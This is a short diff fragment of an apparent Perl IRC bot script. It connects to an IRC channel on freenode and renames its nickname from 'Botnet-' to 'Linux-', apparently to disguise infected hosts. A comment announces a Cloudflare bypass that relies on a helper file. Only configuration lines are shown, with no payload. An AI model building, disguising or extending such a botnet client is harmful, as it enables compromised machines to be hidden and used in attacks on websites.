@@ -6,7 +6,7 @@ my $server  = "irc.freenode.net";
 my $code = int(rand(100000));
 my $channel = "#hyakimaro";
 my $port    = "6667";
-my $nick    = "Botnet-$code"; #$code vai gerar um número aleatório#
+my $nick    = "Linux-$code"; #$code vai gerar um número aleatório#
 
 # for bypass cloudflare #
 unless (-e "cc.py") {
